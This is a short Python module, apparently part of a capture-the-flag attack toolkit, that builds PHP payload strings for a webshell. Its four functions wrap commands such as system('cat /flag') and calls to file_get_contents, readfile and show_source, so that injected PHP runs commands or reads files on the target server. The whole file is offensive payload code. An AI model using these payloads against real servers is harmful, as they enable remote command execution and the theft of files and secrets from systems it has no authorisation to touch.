#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from exps.webshell import *

import base64


def exp_system(flag="cat /flag"):
    return "system('%s');" % flag


def exp_file_get_contents(flag="/flag"):
    return "echo file_get_contents('%s');" % flag


def exp_readfile(flag="/flag"):
    return "echo readfile('%s');" % flag


def exp_show_source(flag="/flag"):
    return "echo show_source('%s');" % flag
